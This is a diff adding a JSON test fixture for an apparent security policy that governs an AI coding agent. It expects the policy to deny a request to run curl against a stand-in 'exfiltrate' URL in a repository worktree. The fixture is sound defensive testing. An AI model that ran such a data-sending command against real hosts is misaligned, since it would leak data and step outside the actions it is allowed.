@@ -1,0 +1,31 @@
+{
+  "case_id": "dangerous-command.denied",
+  "expected_decision": "deny",
+  "expected_errors": [
+    "default deny: no allow rule matched",
+    "action denied: process:run_command",
+    "command outside validation allowlist denied"
+  ],
+  "request": {
+    "task_id": "task_policy_011",
+    "run_id": "run_policy_011",
+    "capability_id": "repo.patch.codex",
+    "action": "process:run_command",
+    "requested_at": "2026-06-28T02:45:00Z",
+    "target": {
+      "type": "worktree_process",
+      "ref": "process://curl"
+    },
+    "command": {
+      "name": "curl",
+      "argv": ["curl", "-fsS", "https://example.invalid/exfiltrate"]
+    },
+    "context_refs": [
+      {
+        "kind": "repo_worktree",
+        "ref": "worktree://P9-security-policy-contract"
+      }
+    ],
+    "artifact_refs": []
+  }
+}
